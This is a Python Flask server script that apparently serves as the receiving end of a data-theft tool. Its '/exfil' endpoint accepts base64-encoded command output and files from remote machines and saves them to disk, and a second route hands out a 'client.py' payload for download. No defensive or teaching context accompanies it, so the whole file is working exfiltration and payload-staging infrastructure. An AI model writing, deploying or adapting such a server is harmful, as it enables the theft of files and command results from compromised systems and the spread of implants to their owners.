from flask import Flask, request, send_file
import base64
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.data
    x_type = request.headers.get('X-Type')
    if x_type == 'command':
        decoded_data = base64.b64decode(data)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"command_output_{timestamp}.txt"
        with open(filename, 'wb') as f:
            f.write(decoded_data)
        return 'OK', 200
    elif x_type == 'file':
        decoded_data = base64.b64decode(data)
        filename = request.headers.get('X-Filename')
        if filename:
            # Sanitize filename to avoid path traversal
            filename = os.path.basename(filename)
            with open(filename, 'wb') as f:
                f.write(decoded_data)
            return 'OK', 200
        else:
            return 'Missing X-Filename', 400
    else:
        return 'Invalid X-Type', 400

@app.route('/client.py', methods=['GET'])
def serve_client():
    return send_file('client.py')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
